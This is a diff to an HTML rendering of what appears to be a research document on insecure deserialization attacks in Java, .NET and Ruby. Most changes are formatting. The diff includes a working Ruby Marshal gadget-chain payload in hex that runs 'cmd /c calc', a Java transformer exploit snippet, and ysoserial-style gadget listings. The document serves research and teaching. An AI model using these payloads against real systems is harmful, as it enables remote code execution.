@@ -130,6 +130,7 @@ body .markdown-body
 .markdown-body .codehilitetable pre,
 .markdown-body .codehilitetable div.codehilite {
   margin: 0;
+  white-space : pre-wrap !important;
 }
 
 .markdown-body .linenos,
@@ -289,6 +290,8 @@ body .markdown-body
 .markdown-body pre {
   margin-top: 0;
   margin-bottom: 0;
+  font-size: 11px !important;
+  white-space : pre-wrap !important;
 }
 
 .markdown-body kbd {
@@ -1224,7 +1227,7 @@ The ROP chain uses an opaque class order in order to chain subsequent classes us
 
 <span class="kd">public</span> <span class="kd">class</span> <span class="nc">ExeCmdInvokerTransformer</span> <span class="o">{</span>
 
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">SecurityException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">IllegalArgumentException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span><span class="n">{</span>
 
         <span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">execArgs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&quot;cmd /c calc&quot;</span><span class="o">};</span>
 
@@ -1318,11 +1321,11 @@ Deserts now contains Gobi? Result: 0.8610944732469801
      Groovy1             @frohoff                               groovy:2.3.9
      Hibernate1          @mbechler
      Hibernate2          @mbechler
-     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1
      JRMPClient          @mbechler
      JRMPListener        @mbechler
-     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, ...
+     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, ...
      Jdk7u21             @frohoff
      Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
      MozillaRhino1       @matthias_kaiser                       js:1.7R2
@@ -1880,13 +1883,13 @@ Available formatters:
                         SoapFormatter
                         NetDataContractSerializer
                         LosFormatter
-        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., &#39;-c ExploitClass.cs;System.Windows.Forms.dll&#39;.)
+        ActivitySurrogateSelectorFromFile (ActivitySurrogateSelector gadget by James Forshaw.)
                 Formatters:
                         BinaryFormatter
                         ObjectStateFormatter
                         SoapFormatter
                         LosFormatter
-        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. This gadget ignores the command parameter and executes the constructor of ExploitClass class.)
+        ActivitySurrogateSelector (ActivitySurrogateSelector gadget by James Forshaw. )
                 Formatters:
                         BinaryFormatter
                         ObjectStateFormatter
@@ -1908,7 +1911,7 @@ Available formatters:
                         SoapFormatter
                         NetDataContractSerializer
                         LosFormatter
-        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565 (Published: 07/11/2017))
+        PSObject (PSObject Gadget by Oleksandr Mirosh and Alvaro Munoz. Target must run a system not patched for CVE-2017-8565)
                 Formatters:
                         BinaryFormatter
                         ObjectStateFormatter
@@ -3327,7 +3330,12 @@ TEST
 </ol>
 <p>The script provided by the researcher, generates the hex version and the base64 version of the payload, for the static command &ldquo;id&rdquo;. The payload may be found even on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">PayloadAllTheThings</a>.</p>
 <p>To test it, it is enough to launch the following command:</p>
-<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load([&quot;0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d4922167c636d64202f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446&quot;].pack(&quot;H*&quot;)) rescue nil&#39;</span>
+<div class="codehilite"><pre><span class="nv">$ </span>ruby -e <span class="s1">&#39;Marshal.load([&quot;\
+0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073\
+a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3\
+a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d4922167c636d64202\
+f632063616c6320313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\
+&quot;].pack(&quot;H*&quot;)) rescue nil&#39;</span>
 </pre></div>
 
 <p>However, the script provided shows a list of drawbacks:</p>
